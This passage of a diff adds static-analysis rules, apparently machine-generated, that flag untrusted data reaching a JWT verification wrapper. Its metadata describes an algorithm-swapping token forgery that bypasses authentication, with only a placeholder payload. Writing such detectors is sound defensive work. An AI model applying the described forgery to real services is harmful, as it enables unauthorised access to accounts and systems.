+    - pattern: $OBJ.verify(...)
+    - pattern: verify(...)
+  message: 'Cryptographic Failure via `token`
+
+    Vulnerable Sink: Passes untrusted data directly to `jwt.verify`.'
+  severity: ERROR
+  languages: &id037
+  - javascript
+  - typescript
+  metadata: &id038
+    category: security
+    technology:
+    - javascript
+    - typescript
+    source: fixora-ai-analysis
+    vulnerability_type: Cryptographic Failure
+    confidence: HIGH
+    wrapper_defined_in: auth.js
+    wraps:
+    - jwt.verify
+    modules_used:
+    - jsonwebtoken
+    vulnerable_parameter: token
+    malicious_payload: <malicious_data>
+    exploit_explanation: The attacker creates a token with a different algorithm,
+      allowing them to bypass authentication.
+    exploit_injected_example: verifyToken(token = <malicious_data>)
+    impact_summary: Attackers can bypass authentication.
+- id: fixora-taint-verifytoken
+  mode: taint
+  pattern-sources:
+  - pattern: req.$W
+  - pattern: request.$W
+  - pattern: req.body.$W
+  - pattern: req.query.$W
+  - pattern: req.params.$W
+  - pattern: window.location.$W
+  - pattern: document.cookie
+  - pattern: fetch(...)
+  - pattern: axios(...)
+  pattern-sinks:
+  - pattern: verifyToken(...)
+  - pattern: $OBJ.verifyToken(...)
+  message: 'Taint tracked to vulnerable wrapper `verifyToken`.
+
+    Cryptographic Failure via `token`
+
+    Vulnerable Sink: Passes untrusted data directly to `jwt.verify`.'
+  severity: ERROR
+  languages: *id037
+  metadata: *id038
